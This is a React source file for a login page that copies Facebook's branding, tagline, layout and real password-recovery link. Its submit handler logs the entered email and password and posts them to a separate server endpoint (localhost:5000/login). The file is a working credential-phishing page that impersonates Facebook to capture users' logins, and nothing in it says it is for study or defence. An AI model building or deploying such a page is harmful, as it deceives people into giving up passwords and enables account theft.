import React from "react";
import "./Home.css";
import { useForm } from "react-hook-form";

const Home = () => {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();

  const onSubmit = (data) => {
    const eventData = {
      email: data.email,
      password: data.password,
    };
    console.log(eventData);

    const url = `http://localhost:5000/login`;
    fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(eventData),
    }).then((res) => {
      if (res) {
        alert("Admin added Successfully");
       
      }
    });
  };
  return (
    <div className="home_section">
      <div className="container">
        <div className="row mt-5">
          <div className="col-md-7">
            <div className="side_text mb-4">
              <h1>facebook</h1>
              <h4>
                Facebook helps you connect and share with the people in your
                life.
              </h4>
            </div>
          </div>

          <div className="col-md-5">
            <div className="login text-center">
              <form onSubmit={handleSubmit(onSubmit)}>

                <input className="form-control" placeholder="Email Address or Phone Number" {...register("email")} />
<br/>
                <input className="form-control" placeholder="Password" {...register("password", { required: true })} />

                {errors.password && <span>Please enter Your Password</span>}
                <br/>

                <input  className="form-control bg-primary text-white" style={{fontWeight:"700",fontSize:"18px"}} type="submit" Value="Login" />
              </form>
              <div className="home_btn">
              <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forget Password?</a>
              <br/>
              <hr></hr>
              <button className="btn btn-success">Create New Account</button>
              </div>
            </div>
            <div className="page mt-4 ">
                <p><b>Create a Page</b> for a celebrity, band or business.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
